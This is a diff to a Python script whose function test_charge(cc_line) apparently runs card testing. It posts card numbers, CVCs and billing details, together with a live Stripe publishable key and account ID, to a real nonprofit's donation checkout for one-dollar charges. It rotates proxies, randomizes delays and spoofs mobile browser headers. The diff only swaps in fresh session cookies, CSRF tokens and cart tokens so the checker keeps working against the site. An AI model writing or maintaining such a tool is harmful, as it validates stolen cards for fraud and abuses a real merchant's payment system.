@@ -227,7 +227,7 @@ def test_charge(cc_line):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',  
         }  
 
-        data = f'billing_details[address][city]={city}&billing_details[address][country]=US&billing_details[address][line1]={street.replace(" ", "+")}&billing_details[address][line2]=&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&billing_details[name]={name.replace(" ", "+")}&billing_details[email]={email}&type=card&card[number]={ccn}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F5445b56991%3B+stripe-js-v3%2F5445b56991%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.onamissionkc.org&time_on_page=145592&client_attribution_metadata[client_session_id]=22e7d0ec-db3e-4724-98d2-a1985fc4472a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=7904f40e-9588-48b2-bc6b-fb88e0ef71d5&guid=18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd&muid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48&sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67&key=pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e&_stripe_account=acct_1LwocDFHMGxIu0Ep'  
+        data = f'billing_details[address][city]={city}&billing_details[address][country]=US&billing_details[address][line1]={street.replace(" ", "+")}&billing_details[address][line2]=&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&billing_details[name]={name.replace(" ", "+")}&billing_details[email]={email}&type=card&card[number]={ccn}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&pasted_fields=number&payment_user_agent=stripe.js%2F4ee0ef76c3%3B+stripe-js-v3%2F4ee0ef76c3%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.onamissionkc.org&time_on_page=374065&client_attribution_metadata[client_session_id]=116eab5f-5267-4f76-a605-776bfe51ace4&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=2e44226d-93d9-4f56-a0ba-a29cd22089d7&guid=45b6bfde-c8ee-4183-b3f2-18806c2c7734f646c6&muid=c482f347-993d-4374-87fb-053c66058373e5eda4&sid=56f9f786-8f07-46de-9731-2ddafb8398229438e8&key=pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e&_stripe_account=acct_1LwocDFHMGxIu0Ep'  
 
         proxy_dict = get_random_proxy()
         
@@ -262,11 +262,11 @@ def test_charge(cc_line):
         time.sleep(random.uniform(2, 4))
 
         cookies = {  
-            'crumb': 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',  
-            'ss_cvr': 'b5544939-8b08-4377-bd39-dfc7822c1376|1760724937850|1760724937850|1760724937850|1',  
-            'ss_cvt': '1760724937850',  
-            '__stripe_mid': '3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48',  
-            '__stripe_sid': '9d45db81-2d1e-436a-b832-acc8b6abac4814eb67',  
+            'crumb': 'Bb3llzbbHEzEZTA1NWM3Mjg5NzA4MTRiMDU4MmZjMjdmYzI5MDk1',  
+            'ss_cvr': 'ss_cvr=4ce4390e-5663-4476-8fcc-3d201251d43c|1761044455597|1761044455597|1761044455597|1',  
+            'ss_cvt': '1761044455597',  
+            '__stripe_mid': 'c482f347-993d-4374-87fb-053c66058373e5eda4',  
+            '__stripe_sid': '56f9f786-8f07-46de-9731-2ddafb8398229438e8',  
         }  
 
         headers = {  
@@ -275,7 +275,7 @@ def test_charge(cc_line):
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',  
             'content-type': 'application/json',  
             'origin': 'https://www.onamissionkc.org',  
-            'referer': 'https://www.onamissionkc.org/checkout?cartToken=OBEUbArW4L_xPlSD9oXFJrWCGoeyrxzx4MluNUza',  
+            'referer': 'https://www.onamissionkc.org/checkout?cartToken=JwX3wgs9-diPHs5hkHWyAqx7_VGT_5Ka3F3MwRgV',  
             'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',  
             'sec-ch-ua-mobile': '?1',  
             'sec-ch-ua-platform': '"Android"',  
@@ -283,7 +283,7 @@ def test_charge(cc_line):
             'sec-fetch-mode': 'cors',  
             'sec-fetch-site': 'same-origin',  
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',  
-            'x-csrf-token': 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',  
+            'x-csrf-token': 'Bb3llzbbHEzEZTA1NWM3Mjg5NzA4MTRiMDU4MmZjMjdmYzI5MDk1',  
         }  
 
         json_data = {  
@@ -311,7 +311,7 @@ def test_charge(cc_line):
                 'decimalValue': '1',  
                 'currencyCode': 'USD',  
             },  
-            'cartToken': 'OBEUbArW4L_xPlSD9oXFJrWCGoeyrxzx4MluNUza',  
+            'cartToken': 'JwX3wgs9-diPHs5hkHWyAqx7_VGT_5Ka3F3MwRgV',  
             'paymentToken': {  
                 'stripePaymentTokenType': 'PAYMENT_METHOD_ID',  
                 'token': pid,  
